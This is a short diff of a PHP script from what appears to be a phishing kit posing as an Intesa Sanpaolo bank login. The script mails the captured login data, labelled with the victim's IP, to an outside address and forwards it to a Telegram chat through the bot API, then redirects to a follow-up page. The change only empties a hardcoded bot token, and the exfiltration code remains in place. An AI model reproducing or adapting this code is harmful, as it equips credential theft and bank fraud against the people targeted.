@@ -13,7 +13,7 @@ $subject = "LOGIN INTESA [$ip]";
 $headers = "From: LOGIN INTESA <bladsadsada@web.de>";
 $headers .= "MIME-Version: 1.0\n";
 mail($to, $subject, $message,$headers);
-		    $token = "7620796636:AAFpbNIADiQYRqgoFGF4kiNADAwDQqGfQPM";
+		    $token = "";
     file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-5052128612&text=" . urlencode($message)."" );
 header("Location:../Kaart.php");
 }else{
